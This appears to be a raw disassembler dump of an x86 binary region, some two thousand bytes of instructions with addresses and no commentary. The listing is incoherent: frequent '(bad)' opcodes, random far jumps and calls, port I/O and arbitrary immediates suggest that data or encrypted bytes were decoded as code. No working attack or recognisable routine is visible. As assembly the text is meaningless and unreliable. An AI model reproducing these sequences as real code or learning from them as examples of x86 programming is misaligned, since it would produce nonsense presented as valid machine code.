  421114:	sbb    al,BYTE PTR [edx]
  421116:	sub    dh,al
  421118:	cli    
  421119:	pop    eax
  42111a:	dec    eax
  42111b:	xchg   DWORD PTR ds:0x9e007992,eax
  421121:	inc    ebp
  421122:	sbb    BYTE PTR [ebp+esi*1+0x25b50f6b],0xee
  42112a:	mov    eax,ds:0x8c6834f0
  42112f:	sbb    BYTE PTR [ebx-0x51],bl
  421132:	push   ecx
  421133:	(bad)  
  421134:	dec    eax
  421135:	jl     0x4210eb
  421137:	fidivr DWORD PTR [ebp-0x46]
  42113a:	ror    DWORD PTR [ebx-0x17ffbf5e],0xd6
  421141:	packssdw mm4,QWORD PTR [edi]
  421144:	fidiv  DWORD PTR [ebp+0x111b580]
  42114a:	push   cs
  42114b:	cmp    al,0xc7
  42114d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42114e:	clc    
  42114f:	inc    DWORD PTR ds:0x89b3e7f4
  421155:	gs xchg esi,eax
  421157:	clc    
  421158:	and    eax,0xde4311b1
  42115d:	aaa    
  42115e:	fmul   QWORD PTR [esi]
  421160:	xor    BYTE PTR [eax+0x6c392d4b],bh
  421166:	push   esi
  421167:	push   dx
  421169:	fist   DWORD PTR [esi+edx*4]
  42116c:	sub    al,0xcf
  42116e:	or     cl,ch
  421170:	out    dx,al
  421171:	xchg   ecx,eax
  421172:	push   cs
  421173:	mov    al,ds:0x345bdf75
  421178:	es and al,0x5a
  42117b:	adc    cl,0x67
  42117e:	icebp  
  42117f:	fs or  ecx,esp
  421182:	inc    ebx
  421183:	xchg   esp,eax
  421184:	(bad)  
  421185:	sub    eax,ebp
  421187:	and    dl,dh
  421189:	test   DWORD PTR [edi+0x2e],ebx
  42118c:	and    DWORD PTR gs:[ebx],esp
  42118f:	aam    0x87
  421191:	push   0xf5e0e631
  421196:	sbb    al,0x3f
  421198:	ins    DWORD PTR es:[edi],dx
  421199:	sbb    al,0xd
  42119b:	popf   
  42119c:	scas   eax,DWORD PTR es:[edi]
  42119d:	cmp    DWORD PTR [edi],eax
  42119f:	xchg   ecx,eax
  4211a0:	push   esi
  4211a1:	aad    0x7c
  4211a3:	clc    
  4211a4:	fmulp  st(3),st
  4211a6:	in     al,0xcc
  4211a8:	sbb    ch,BYTE PTR ds:0xa32c0805
  4211ae:	cmp    BYTE PTR [edi+0x5257acbd],ch
  4211b4:	mov    ecx,0x875eb9e9
  4211b9:	cmp    ecx,esi
  4211bb:	mov    gs,WORD PTR [esi+eax*8-0x7b7380dd]
  4211c2:	mov    edx,0xe100f4b5
  4211c7:	push   ebx
  4211c8:	mov    edx,0xee9f8c65
  4211cd:	pop    ebp
  4211ce:	call   0xf48f8a41
  4211d3:	push   ebx
  4211d4:	out    0x3e,al
  4211d6:	dec    eax
  4211d7:	jno    0x4211af
  4211d9:	jl     0x42119f
  4211db:	jge    0x42120e
  4211dd:	mov    eax,ds:0x7ce01a12
  4211e2:	out    dx,eax
  4211e3:	std    
  4211e4:	outs   dx,DWORD PTR ds:[esi]
  4211e5:	aaa    
  4211e6:	xchg   esi,eax
  4211e7:	sbb    al,0xb9
  4211e9:	sub    ebx,DWORD PTR [edi]
  4211eb:	xor    ebp,DWORD PTR [ebp+0x1c]
  4211ee:	jg     0x4211a8
  4211f0:	mov    edx,?
  4211f2:	ror    DWORD PTR [ebx-0x33],0x8
  4211f6:	jno    0x4211a7
  4211f8:	push   cs
  4211f9:	rcr    BYTE PTR [esi+ecx*4-0x7],1
  4211fd:	add    bh,ah
  4211ff:	push   0xf53fdfda
  421204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421205:	push   cs
  421206:	push   eax
  421207:	add    DWORD PTR [esp+ebx*4-0x1e],0xffffffe5
  42120c:	jl     0x421207
  42120e:	push   esp
  42120f:	and    ch,ah
  421211:	xlat   BYTE PTR ds:[ebx]
  421212:	add    al,0xbe
  421214:	xchg   edx,eax
  421215:	adc    eax,ebp
  421217:	jp     0x421264
  421219:	aad    0xda
  42121b:	adc    BYTE PTR [eax+0x4b24472a],cl
  421221:	out    dx,al
  421222:	and    al,BYTE PTR [ebx+0x79e248da]
  421228:	and    dl,BYTE PTR [eax+0x51]
  42122b:	jge    0x421286
  42122d:	sbb    eax,0xc77fc049
  421232:	or     ebx,ebp
  421234:	push   0x33400ee5
  421239:	shl    BYTE PTR [edi],0x6a
  42123c:	add    eax,0x88d767e9
  421241:	push   0x84399d67
  421246:	jmp    0xe16:0xe4afbbb7
  42124d:	and    BYTE PTR [ecx-0x21fec9fa],ah
  421253:	mov    ?,edx
  421255:	mov    edi,0x563b6b2f
  42125a:	pop    es
  42125b:	mov    ds:0x3918a086,eax
  421260:	repnz mov ebp,0x43662ef5
  421266:	out    dx,al
  421267:	inc    ebp
  421268:	push   esp
  421269:	aaa    
  42126a:	cmc    
  42126b:	pop    ds
  42126c:	shr    DWORD PTR [edi-0x12],cl
  42126f:	std    
  421270:	fidivr DWORD PTR [ebp-0x10777652]
  421277:	sub    edi,0x5
  42127a:	or     BYTE PTR [esi],0x70
  42127d:	push   edx
  42127e:	outs   dx,DWORD PTR ds:[esi]
  42127f:	add    esi,DWORD PTR [edi-0x17]
  421282:	ror    dl,1
  421284:	pop    ds
  421285:	cmp    eax,0xee1e4d6
  42128a:	xor    al,0x8c
  42128c:	push   edx
  42128d:	dec    ecx
  42128e:	test   BYTE PTR [ebx+0x3a3cec6c],bl
  421294:	into   
  421295:	fld    DWORD PTR [edi-0x34]
  421298:	pop    es
  421299:	and    eax,0xbcdc7fd2
  42129e:	xchg   bx,ax
  4212a0:	or     eax,0xab386c8b
  4212a5:	or     BYTE PTR [eax-0x84c3b84],ah
  4212ab:	jbe    0x42125f
  4212ad:	sub    al,0xaf
  4212af:	jno    0x4212fb
  4212b1:	stos   BYTE PTR es:[edi],al
  4212b2:	loope  0x4212a4
  4212b4:	cli    
  4212b5:	xchg   edx,eax
  4212b6:	mov    ds:0x4c429582,al
  4212bb:	cmc    
  4212bc:	cmp    DWORD PTR [ebp-0x3],edi
  4212bf:	adc    eax,0xeeb0518a
  4212c4:	out    dx,al
  4212c5:	mov    ebp,0x7a077932
  4212ca:	cs rcr esi,0xbb
  4212ce:	popa   
  4212cf:	mov    edx,0xeb068ba
  4212d4:	or     eax,0xbc58585
  4212d9:	pop    ecx
  4212da:	clc    
  4212db:	aad    0x75
  4212dd:	cmp    eax,0x97738aaf
  4212e2:	pop    es
  4212e3:	nop
  4212e4:	les    ebp,FWORD PTR [esi+0x37]
  4212e7:	xchg   BYTE PTR [edx+0x306d9c3d],dh
  4212ed:	in     al,0xa1
  4212ef:	xchg   ebp,eax
  4212f0:	pop    edx
  4212f1:	sti    
  4212f2:	xchg   esp,eax
  4212f3:	stos   DWORD PTR es:[edi],eax
  4212f4:	pop    ebp
  4212f5:	dec    edi
  4212f6:	int    0xc1
  4212f8:	and    bh,BYTE PTR ds:0xb47545b8
  4212fe:	and    eax,0x30424396
  421303:	movhps QWORD PTR [eax],xmm3
  421306:	ss cmp eax,0x1da7e115
  42130c:	fsub   DWORD PTR [ebx-0x7948d52c]
  421312:	test   DWORD PTR [eax],edi
  421314:	mov    edx,0x4f0eac93
  421319:	bound  esp,QWORD PTR [ecx]
  42131b:	add    eax,0x1ae08ea7
  421320:	mov    WORD PTR [edx+edx*1-0x2a],es
  421324:	adc    BYTE PTR [esi],bl
  421326:	js     0x4213a6
  421328:	mov    eax,0x84b3ea69
  42132d:	dec    edi
  42132e:	sub    al,0x6c
  421330:	or     BYTE PTR [ebx],al
  421332:	(bad)  
  421333:	fist   DWORD PTR [edx+0x2f]
  421336:	sti    
  421337:	cmp    edi,edi
  421339:	div    DWORD PTR [edx+eiz*2+0x5a6614b8]
  421340:	rol    DWORD PTR [edx-0x5b7432b0],0x37
  421347:	inc    edx
  421348:	fadd   QWORD PTR [esi-0x62251792]
  42134e:	jmp    ebx
  421350:	push   0x9044332b
  421355:	jg     0x421380
  421357:	scas   al,BYTE PTR es:[edi]
  421358:	mov    ecx,0x874bfde7
  42135d:	repnz pop esp
  42135f:	mov    ch,0x3b
  421361:	inc    ebx
  421363:	and    esp,ebx
  421365:	push   esi
  421366:	pusha  
  421367:	xor    BYTE PTR [esi-0x19],cl
  42136a:	or     edi,DWORD PTR [ebx]
  42136c:	call   DWORD PTR [eax-0x9326cde]
  421372:	mov    eax,ds:0x360bb0a
  421377:	or     DWORD PTR [ecx+0x47d306dd],ecx
  42137d:	jmp    0x3938a2a6
  421382:	xchg   edx,eax
  421383:	sub    eax,0x95551dd2
  421388:	or     eax,edx
  42138a:	sbb    DWORD PTR ds:0xde3bc8a4,edi
  421390:	add    BYTE PTR ds:0x9f28374e,al
  421396:	addr16 into 
  421398:	or     ebx,DWORD PTR [ebx+eax*4-0x740627cd]
  42139f:	mov    eax,0x561502b6
  4213a4:	cmp    eax,0x9199e2bd
  4213a9:	or     al,BYTE PTR [ebx+0x17]
  4213ac:	scas   eax,DWORD PTR es:[edi]
  4213ad:	mov    ebx,0x90c6de8b
  4213b2:	or     al,0xbb
  4213b4:	inc    ebx
  4213b5:	pop    eax
  4213b6:	and    BYTE PTR [ebx+0x65],ah
  4213b9:	jmp    0x42141b
  4213bb:	xchg   ebp,eax
  4213bc:	je     0x4213d7
  4213be:	push   ss
  4213bf:	mov    esi,0xfb24c78d
  4213c4:	outs   dx,DWORD PTR ds:[esi]
  4213c5:	cmp    dh,bl
  4213c7:	xchg   edi,eax
  4213c8:	push   edi
  4213c9:	sub    cl,BYTE PTR [ecx+0x50]
  4213cc:	pop    edx
  4213cd:	jecxz  0x421418
  4213cf:	inc    edx
  4213d0:	ret    
  4213d1:	dec    eax
  4213d2:	popa   
  4213d3:	jne    0x421437
  4213d5:	add    BYTE PTR [ecx-0x1470cc9a],0x29
  4213dc:	cld    
  4213dd:	dec    edi
  4213de:	sbb    al,0x47
  4213e0:	push   ebx
  4213e1:	push   ecx
  4213e2:	sbb    eax,0x6c028ff2
  4213e7:	add    ebx,ebx
  4213e9:	mov    ah,0x1f
  4213eb:	das    
  4213ec:	mov    al,0x3c
  4213ee:	pop    ebx
  4213ef:	jns    0x42144e
  4213f1:	cmp    al,0xe3
  4213f3:	cmp    BYTE PTR [ebx+0x6d],ch
  4213f6:	cmp    al,0x44
  4213f8:	(bad)  
  4213f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213fa:	adc    eax,0xb7cf82be
  4213ff:	sub    BYTE PTR [edi+0x27],ch
  421402:	ins    DWORD PTR es:[edi],dx
  421403:	jl     0x421483
  421405:	ror    DWORD PTR [eax+0x16b23be8],1
  42140b:	ret    0x467e
  42140e:	jmp    0x421459
  421410:	fisubr WORD PTR [edi]
  421412:	add    DWORD PTR [esi+0x12],0x9c29fb5d
  421419:	or     al,0x3
  42141b:	dec    ebx
  42141c:	imul   esi,DWORD PTR [ebx+0x45523796],0xf0f8aa94
  421426:	push   cs
  421427:	imul   ebp,eax,0x3cebb542
  42142d:	adc    edx,ecx
  42142f:	in     al,0xf5
  421431:	fst    QWORD PTR [esi+0x2e8ba541]
  421437:	jg     0x4213e6
  421439:	clc    
  42143a:	adc    DWORD PTR [esi+0x6],eax
  42143d:	and    DWORD PTR [edx],ecx
  42143f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421440:	fistp  DWORD PTR [edx+0x2f5bb405]
  421446:	es loopne 0x4214a2
  421449:	sub    al,BYTE PTR [eax+0x36fb0ff1]
  42144f:	or     al,0x20
  421451:	cld    
  421452:	adc    eax,0x8855130f
  421457:	push   ebx
  421458:	pop    ds
  421459:	dec    edx
  42145a:	xchg   ebx,eax
  42145b:	ja     0x421418
  42145d:	inc    ecx
  42145e:	or     ch,BYTE PTR [ebx+0x2a]
  421461:	es dec ebx
  421463:	xchg   edx,eax
  421464:	cmp    eax,0x3ef8e516
  421469:	dec    ebp
  42146a:	inc    eax
  42146b:	add    cl,BYTE PTR [edx]
  42146d:	xchg   bh,dh
  42146f:	cdq    
  421470:	ror    BYTE PTR [edx+eiz*2-0x66ee959e],1
  421477:	cld    
  421478:	mov    esi,0xe0c37943
  42147d:	es cwde 
  42147f:	mov    cl,BYTE PTR [edx]
  421481:	pop    ss
  421482:	fistp  WORD PTR [eax]
  421484:	arpl   WORD PTR [edi+edi*8+0x3b],si
  421488:	pushf  
  421489:	loop   0x42143f
  42148b:	out    0x80,eax
  42148d:	(bad)  
  42148e:	repz jle 0x42150d
  421491:	jp     0x42147b
  421493:	jae    0x4214f6
  421495:	mov    ah,0x36
  421497:	push   esp
  421498:	out    0x18,eax
  42149a:	mov    ebp,0xfa1f1f8e
  42149f:	dec    esi
  4214a0:	in     al,dx
  4214a1:	aad    0xe5
  4214a3:	imul   edx,DWORD PTR [ebx-0x79],0xbe3914f7
  4214aa:	fild   WORD PTR [edx-0x78]
  4214ad:	pop    edi
  4214ae:	sbb    DWORD PTR [ebx-0x298aad63],edx
  4214b4:	or     esp,DWORD PTR [ebx+0xe]
  4214b7:	iret   
  4214b8:	jl     0x42147c
  4214ba:	push   0x27ed36da
  4214bf:	dec    esp
  4214c0:	ins    BYTE PTR es:[edi],dx
  4214c1:	retf   
  4214c2:	push   ds
  4214c3:	cli    
  4214c4:	mov    eax,DWORD PTR ss:[ebx-0x4242718f]
  4214cb:	cld    
  4214cc:	cmp    eax,0xdd640dba
  4214d1:	dec    edx
  4214d2:	ss mov al,al
  4214d5:	out    dx,eax
  4214d6:	neg    ebx
  4214d8:	or     ch,bl
  4214da:	es pop ss
  4214dc:	js     0x42152f
  4214de:	pop    ss
  4214df:	cld    
  4214e0:	cmp    al,BYTE PTR [ecx-0x2a]
  4214e3:	xor    eax,0x5c2aef55
  4214e8:	mov    esi,0x163bcc9f
  4214ed:	fst    QWORD PTR [esi+0x7652d485]
  4214f3:	push   ebx
  4214f4:	repnz call 0x71fe:0xb9d26356
  4214fc:	sub    BYTE PTR [ebp+0x2f],ah
  4214ff:	mov    edx,DWORD PTR [esi-0x2ef61e53]
  421505:	pop    ds
  421506:	mov    esi,0xf32b4e94
  42150b:	pop    eax
  42150c:	ins    BYTE PTR es:[edi],dx
  42150d:	in     al,0xee
  42150f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421510:	or     esi,DWORD PTR [edi+0x7e9e48a8]
  421516:	sbb    al,0xfb
  421518:	jmp    0x42153f
  42151a:	xor    eax,0x80d0df92
  42151f:	inc    ecx
  421520:	loope  0x4214a4
  421522:	in     al,0xeb
  421524:	dec    BYTE PTR [ecx-0x34]
  421527:	pop    ecx
  421528:	mov    WORD PTR [ecx-0x48],fs
  42152b:	(bad)  
  42152c:	pop    eax
  42152d:	cmp    eax,0x918dabe2
  421532:	loope  0x421528
  421534:	or     ebp,eax
  421536:	sbb    dl,BYTE PTR [ecx]
  421538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421539:	pop    eax
  42153a:	sub    DWORD PTR [eax+esi*2+0x4bad34d3],ebx
  421541:	mov    es,WORD PTR [eax+ebp*2]
  421544:	sahf   
  421545:	push   esp
  421546:	shl    BYTE PTR [ecx+esi*2+0xa],cl
  42154a:	mov    dl,BYTE PTR [ebx]
  42154c:	int3   
  42154d:	(bad)  
  42154e:	cmp    eax,0xdb4979c
  421553:	aam    0x8c
  421555:	adc    BYTE PTR [ebp+esi*2+0x1cb43f84],0x39
  42155d:	push   edx
	...
  42156a:	push   edi
  42156b:	pop    edx
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x14c7fbb5
  421579:	cdq    
  42157a:	cmp    BYTE PTR [ecx+eax*1+0x67c00],ah
  421581:	add    BYTE PTR [eax-0x1b],bl
  421584:	retf   
  421585:	outs   dx,DWORD PTR ds:[esi]
  421586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421587:	add    edx,edx
  421589:	pop    ebx
  42158a:	retf   
  42158b:	pop    ds
  42158c:	(bad)  
  42158d:	lahf   
  42158e:	and    al,0x59
  421590:	aad    0xfb
  421592:	call   0x59285eeb
  421597:	(bad)  
  421598:	jp     0x421557
  42159a:	xor    BYTE PTR [edx],bl
  42159c:	sbb    edx,eax
  42159e:	inc    ebp
  42159f:	xchg   edx,eax
  4215a0:	inc    edi
  4215a1:	loopne 0x42153b
  4215a3:	fadd   st(7),st
  4215a5:	jle    0x421569
  4215a7:	les    ebp,FWORD PTR ds:[esp+eiz*4-0x50]
  4215ac:	sbb    al,0xd4
  4215ae:	inc    edx
  4215af:	retf   
  4215b0:	adc    edi,ebp
  4215b2:	xor    al,BYTE PTR [ebp+0x62]
  4215b5:	mov    ecx,0x23a3046a
  4215ba:	(bad)  
  4215bb:	aad    0xa1
  4215bd:	popa   
  4215be:	push   ebp
  4215bf:	mov    al,0xe1
  4215c1:	mov    ds:0x261d689c,eax
  4215c6:	jno    0x421568
  4215c8:	adc    esi,DWORD PTR [edx+0x47]
  4215cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215cc:	cmp    eax,0xee9772ca
  4215d1:	dec    esi
  4215d2:	add    edi,ebx
  4215d4:	adc    eax,0x109d18ca
  4215d9:	loop   0x4215bb
  4215db:	mov    ebx,0x96fe2ff1
  4215e0:	mov    ebp,0xcc580207
  4215e5:	mov    eax,cs
  4215e7:	stos   BYTE PTR es:[edi],al
  4215e8:	fsub   DWORD PTR [ecx-0x62d16baa]
  4215ee:	mul    DWORD PTR [eax]
  4215f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215f1:	adc    DWORD PTR [esi-0x59d0b46e],edx
  4215f7:	add    cl,BYTE PTR [eax]
  4215f9:	fmul   st,st(6)
  4215fb:	mov    cl,0x88
  4215fd:	test   al,0x1e
  4215ff:	sub    al,BYTE PTR [edx-0x36]
  421602:	xchg   edx,eax
  421603:	sbb    ebp,edi
  421605:	push   esp
  421606:	js     0x421612
  421608:	int    0x3
  42160a:	mov    esi,0xac4ea836
  42160f:	bound  edi,QWORD PTR [ecx]
  421611:	dec    edx
  421612:	dec    ecx
  421613:	jne    0x421685
  421615:	enter  0x4a1c,0x85
  421619:	sbb    al,0x47
  42161b:	jo     0x421660
  42161d:	adc    ecx,DWORD PTR [ebx-0x30]
  421620:	push   ss
  421621:	mov    esp,0xd6366306
  421626:	dec    ecx
  421627:	xchg   ebx,eax
  421628:	xor    al,BYTE PTR [edx-0x28e326fc]
  42162e:	addr16 mov dh,cl
  421631:	sub    BYTE PTR [ebp+0x71d655f9],dh
  421637:	push   edi
  421638:	bound  esp,QWORD PTR [edx+eiz*2]
  42163b:	arpl   WORD PTR [esi+0x1185d019],si
  421641:	dec    ecx
  421642:	and    eax,0x2496ed29
  421647:	cs pushf 
  421649:	fwait
  42164a:	retf   0x66d5
  42164d:	daa    
  42164e:	dec    esi
  42164f:	fnstcw WORD PTR [esi-0x4ae312c]
  421655:	retf   0xa156
  421658:	cs scas eax,DWORD PTR es:[edi]
  42165a:	aam    0xb4
  42165c:	repz clc 
  42165e:	mov    al,0xb9
  421660:	cmc    
  421661:	mov    edi,0x911a981e
  421666:	inc    ebx
  421667:	sub    al,0xf3
  421669:	pusha  
  42166a:	add    eax,0x9b960499
  42166f:	mov    esi,0xd120d792
  421674:	adc    BYTE PTR [edx],bh
  421676:	add    DWORD PTR [edi-0x10e4dbe2],ecx
  42167c:	dec    ebx
  42167d:	mov    ebx,eax
  42167f:	enter  0x8041,0x9e
  421683:	inc    esi
  421684:	out    dx,eax
  421685:	xchg   ch,ah
  421687:	inc    edi
  421688:	rcl    DWORD PTR [eax-0x6fab4134],0x77
  42168f:	and    ah,BYTE PTR [ecx]
  421691:	inc    ebp
  421692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421693:	pop    edx
  421694:	add    BYTE PTR [esi-0x77],ah
  421697:	add    eax,0x41566788
  42169c:	inc    esi
  42169d:	ja     0x4216f3
  42169f:	pop    edi
  4216a0:	aam    0xd7
  4216a2:	dec    eax
  4216a3:	push   ecx
  4216a4:	call   0xd302:0x2419cd63
  4216ab:	xlat   BYTE PTR ds:[ebx]
  4216ac:	stc    
  4216ad:	mov    BYTE PTR [edx+0x3413a0b9],dl
  4216b3:	adc    DWORD PTR [edi+0x6c],esi
  4216b6:	xchg   edx,eax
  4216b7:	push   ss
  4216b8:	inc    ecx
  4216b9:	push   esp
  4216ba:	jp     0x4216c3
  4216bc:	pop    ss
  4216bd:	shl    bl,cl
  4216bf:	es sti 
  4216c1:	pop    eax
  4216c2:	cmp    esp,DWORD PTR [eax-0x727bebd3]
  4216c8:	scas   eax,DWORD PTR es:[edi]
  4216c9:	or     ebx,DWORD PTR [edx+0x28]
  4216cc:	and    BYTE PTR [ebx-0x4d97b3d],dl
  4216d2:	inc    esi
  4216d3:	jo     0x421656
  4216d5:	mov    ds:0xdd518a78,eax
  4216da:	daa    
  4216db:	add    ecx,DWORD PTR [ebx+0x39825ca2]
  4216e1:	or     edi,eax
  4216e3:	xchg   esp,eax
  4216e4:	xor    DWORD PTR [ebx-0x23cb6df3],0x46
  4216eb:	cdq    
  4216ec:	inc    ecx
  4216ed:	stc    
  4216ee:	mov    eax,0xeffa182a
  4216f3:	rcl    DWORD PTR [esi-0x1f],1
  4216f6:	jl     0x421695
  4216f8:	dec    ebp
  4216f9:	jge    0x421721
  4216fb:	push   ebp
  4216fc:	fdivr  QWORD PTR [edi+edi*2-0x3]
  421700:	out    0xa5,eax
  421702:	add    dl,bl
  421704:	inc    ecx
  421705:	push   esi
  421706:	dec    edx
  421707:	ss pop eax
  421709:	fldcw  WORD PTR [ebx-0xe]
  42170c:	and    BYTE PTR [ecx+0x294f3222],ch
  421712:	popa   
  421713:	and    ebx,DWORD PTR [ebp+0x21]
  421716:	pop    edx
  421717:	xchg   ebp,edi
  421719:	pop    esi
  42171a:	xchg   BYTE PTR [ebp+0x28],dh
  42171d:	sbb    BYTE PTR [esi+0x53e9d255],dl
  421723:	pushf  
  421724:	sbb    edx,esp
  421726:	push   0xffffffb6
  421728:	jg     0x421780
  42172a:	xchg   cl,al
  42172c:	dec    edx
  42172d:	pop    eax
  42172e:	push   ebp
  42172f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421730:	add    BYTE PTR [esi+esi*1-0x26],al
  421734:	rol    ecx,cl
  421736:	or     eax,0xfca2273
  42173b:	mov    esi,0xedb942b9
  421740:	test   eax,0x86d298d9
  421745:	mov    ah,0x7c
  421747:	add    DWORD PTR [ecx+0xc],eax
  42174a:	clc    
  42174b:	je     0x42170a
  42174d:	into   
  42174e:	add    al,0x43
  421750:	and    edi,DWORD PTR [edx+0x303fc3ec]
  421756:	pop    ebx
  421757:	jne    0x4217b7
  421759:	adc    eax,0x666413c4
  42175e:	aad    0x1f
  421760:	sbb    al,cl
  421762:	and    al,0xf1
  421764:	lods   al,BYTE PTR ds:[esi]
  421765:	stos   DWORD PTR es:[edi],eax
  421766:	mov    cl,0xe3
  421768:	aad    0x22
  42176a:	retf   
  42176b:	outs   dx,BYTE PTR ds:[esi]
  42176c:	rcr    BYTE PTR [edi],0xed
  42176f:	sub    eax,DWORD PTR [edx+ecx*2]
  421772:	xlat   BYTE PTR ds:[ebx]
  421773:	mov    ?,WORD PTR [esp+ebp*4-0x4b42321d]
  42177a:	jg     0x4217f7
  42177c:	out    dx,al
  42177d:	adc    edi,ebp
  42177f:	daa    
  421780:	mov    eax,0x1b1ff9f0
  421785:	jecxz  0x421729
  421787:	and    DWORD PTR [ecx-0x6ae2e890],edi
  42178d:	mov    cl,BYTE PTR [esi-0x14]
  421790:	inc    ecx
  421791:	push   edx
  421792:	mov    ah,0xa9
  421794:	push   esi
  421795:	push   ecx
  421796:	daa    
  421797:	push   eax
  421798:	pop    es
  421799:	add    ebx,DWORD PTR [edi+0x3fbf7396]
  42179f:	xor    eax,0x7c4af58e
  4217a4:	sub    dl,BYTE PTR [ebx+0x7c]
  4217a7:	xor    eax,0xef902a5f
  4217ac:	inc    esp
  4217ad:	jle    0x421754
  4217af:	or     bh,dl
  4217b1:	and    BYTE PTR [edx-0x45],dl
  4217b4:	test   eax,0x4d1acd0c
  4217b9:	inc    ebp
  4217ba:	push   es
  4217bb:	ret    
  4217bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217bd:	mov    ebx,0x42474843
  4217c2:	xchg   edi,eax
  4217c3:	test   BYTE PTR [ecx-0x35],dl
  4217c6:	cwde   
  4217c7:	xor    eax,0xbda5adcb
  4217cc:	data16 fld DWORD PTR [esi]
  4217cf:	jl     0x421800
  4217d1:	pop    edx
  4217d2:	push   ss
  4217d3:	repz xor bl,0x7f
  4217d7:	stos   DWORD PTR es:[edi],eax
  4217d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d9:	aas    
  4217da:	(bad)  [ebx-0x15]
  4217dd:	pop    ds
  4217de:	mov    ecx,0x32eb3038
  4217e3:	sbb    DWORD PTR [eax-0x4a],esp
  4217e6:	or     DWORD PTR [edx+0x6b6001b3],esp
  4217ec:	ficom  WORD PTR [ebp-0x7f2e3efb]
  4217f2:	neg    BYTE PTR [ebp+esi*8+0x64]
  4217f6:	xchg   BYTE PTR [edx],al
  4217f8:	and    al,0x50
  4217fa:	cmp    BYTE PTR [ecx],ch
  4217fc:	mov    bl,0x27
  4217fe:	mov    bh,0xd
  421800:	mov    ch,0x21
  421802:	sub    al,0xb4
  421804:	xchg   edx,eax
  421805:	mov    eax,ds:0xfc42d439
  42180a:	sub    DWORD PTR [ecx],0xffffffa6
  42180d:	retf   0xb626
  421810:	call   0x6945:0x41dbab1b
  421817:	jo     0x4217c0
  421819:	mov    al,0xae
  42181b:	pop    ebx
  42181c:	push   0x1af31266
  421821:	push   ss
  421822:	add    al,0x26
  421824:	push   ecx
  421825:	push   edx
  421826:	mov    esi,0x431913f5
  42182b:	sub    eax,0x5a67a226
  421830:	pop    edx
  421831:	sbb    al,0xa2
  421833:	mov    eax,ds:0xc1f649f7
  421838:	cmp    eax,0x4a8c128e
  42183d:	(bad)  
  42183e:	fadd   DWORD PTR [esi-0x3c73c1af]
  421844:	rep outs dx,DWORD PTR ds:[esi]
  421846:	adc    DWORD PTR ds:0xf87e1f16,esi
  42184c:	les    eax,FWORD PTR ds:0x1fdecdc5
  421852:	add    DWORD PTR [esi+0x77],ecx
  421855:	xor    al,BYTE PTR gs:[ebx+0x1de0049d]
  42185c:	outs   dx,BYTE PTR ds:[esi]
  42185d:	test   DWORD PTR [eax],0xb72f8b3f
  421863:	add    esi,DWORD PTR [ebp+0x5f]
  421866:	sbb    DWORD PTR [edi+0x35],esp
  421869:	leave  
  42186a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42186b:	pop    eax
  42186c:	mov    BYTE PTR [esi],al
  42186e:	dec    ebx
  42186f:	cmp    eax,DWORD PTR [ecx+eiz*1+0x1]
  421873:	jmp    0x3f7:0xf5c70b3c
  42187a:	pop    eax
  42187b:	jge    0x4218d4
  42187d:	lods   eax,DWORD PTR ds:[esi]
  42187e:	mov    dh,0xa
  421880:	and    dl,bl
  421882:	stos   DWORD PTR es:[edi],eax
  421883:	inc    edi
  421884:	push   edx
  421885:	mov    ecx,eax
  421887:	popa   
  421888:	dec    edx
  421889:	ds cld 
  42188b:	lock sub edx,eax
  42188e:	inc    BYTE PTR [eax]
  421890:	xor    eax,0x86e278bc
  421895:	aad    0x7e
  421897:	test   BYTE PTR ds:0xd75ecac0,al
  42189d:	inc    ecx
  42189e:	arpl   WORD PTR [ebx],sp
  4218a0:	fcomp  QWORD PTR [ebp-0x6587dfb9]
  4218a6:	in     eax,dx
  4218a7:	xor    eax,esp
  4218a9:	and    ch,BYTE PTR [edi+0x43]
  4218ac:	loopne 0x4218be
  4218ae:	int    0x64
  4218b0:	lods   eax,DWORD PTR ds:[esi]
  4218b1:	xor    bl,dl
  4218b3:	mov    WORD PTR [edx],fs
  4218b5:	jmp    0xb1be6d0c
  4218ba:	add    BYTE PTR cs:[esi],0xff
  4218be:	or     ecx,DWORD PTR [ecx+0x7f328fc9]
  4218c4:	retf   0x4f0d
  4218c7:	add    eax,eax
  4218c9:	sub    al,ch
  4218cb:	pusha  
  4218cc:	pop    edx
  4218cd:	sbb    DWORD PTR [edi+eax*8],ebx
  4218d0:	mov    ch,0x1e
  4218d2:	jo     0x4218ce
  4218d4:	push   es
  4218d5:	and    al,BYTE PTR [edi-0x53]
  4218d8:	fbld   TBYTE PTR [edi+eax*4]
  4218db:	xor    ah,ah
  4218dd:	dec    BYTE PTR [ebx+0x55]
  4218e0:	push   edx
  4218e1:	xchg   edx,eax
  4218e2:	and    DWORD PTR [esi],edx
  4218e4:	jne    0x4218dc
  4218e6:	hlt    
  4218e7:	mov    BYTE PTR [ebx-0x4688119],bl
  4218ed:	dec    ebp
  4218ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218ef:	stc    
  4218f0:	(bad)  
  4218f1:	ret    0x767b
  4218f4:	test   eax,0x3c6bc771
  4218f9:	cmp    edx,DWORD PTR [edx+0x43a0eced]
  4218ff:	push   ss
  421900:	pop    ds
  421901:	cvtps2pd xmm4,QWORD PTR [edi+ecx*4-0x64]
  421906:	jmp    0xd7ec:0xa3a8bba
  42190d:	sub    al,0xad
  42190f:	adc    al,0x37
  421911:	cmp    al,0x61
  421913:	add    BYTE PTR [edi+ecx*4+0x664c6484],dl
  42191a:	xor    BYTE PTR [eax],bl
  42191c:	retw   
  42191e:	shl    BYTE PTR [edx],cl
  421920:	sbb    BYTE PTR [edi+0x7a],bl
  421923:	in     eax,0x28
